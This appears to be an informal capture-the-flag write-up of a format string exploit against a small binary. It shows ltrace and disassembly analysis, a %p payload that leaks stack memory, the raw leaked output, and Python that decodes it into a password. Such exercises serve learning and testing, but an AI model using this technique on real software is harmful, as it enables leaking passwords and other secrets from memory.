with ltrace we find that the file opens passwd.

the thing uses fgets to read input, strncmp to check passwd, probably checking it against the actual flag since ltrace shows attempt to read exactly that.

printf is used for printing the 

> pepe does not have access!

line, meaning it takes username as arg, so let's play with that, feeding it some %p

now lets see where this thing reads in disas main:

   0x00000000004008e6 <+210>:    lea    -0xa0(%rbp),%rax //create buff for reading 0xa0 = 160 in dec
...
   0x00000000004008fe <+234>:    mov    %rax,%rdi //into the rax 
   0x0000000000400901 <+237>:    callq  0x400690 <fread@plt> //we read

https://man7.org/linux/man-pages/man3/printf.3.html
 Format of the format string
check here what da $ doin, basically at allows to get to a place we need in buff for our purposes;

$rsp - the stack pointer here. it's size: 
       0x0000000000400818 <+4>:    sub    $0x120,%rsp
0x120 = 288

meaning we take 160 bytes out of 288 sized stack, thus buff beginning at 288 - 160
%p will move 8 bytes per step (ptr size == 8 in x64 systems)
thus to print the right bit of stack with passwd we start at (288 - 160) / 8


however this is all some github shit


lets do our way eh?

why not spam %p 30 times and see what we get


11112222333%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p


111122223330x7fffffffe4b0(nil)0x6b0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6a80x1f7ff9a080x6b6b6b(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x32323232313131310x25702570253333330x2570257025702570 does not have access!

lets reverse the shit and see what we get

we check the stuff between nils, notice that reversed 0x2a = '*' and other shit from input, somewhere we will find our buff. but in between we see 

0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d

lets separate them and use .decode() method in python (in vm btw lol)

but instead of hello world obviously our shit
so we have 

0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d


>>> a = "756e505234376848".decode("hex")[::-1]
>>> print(a)
Hh74RPnu

and so on gives us 

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

lol it works
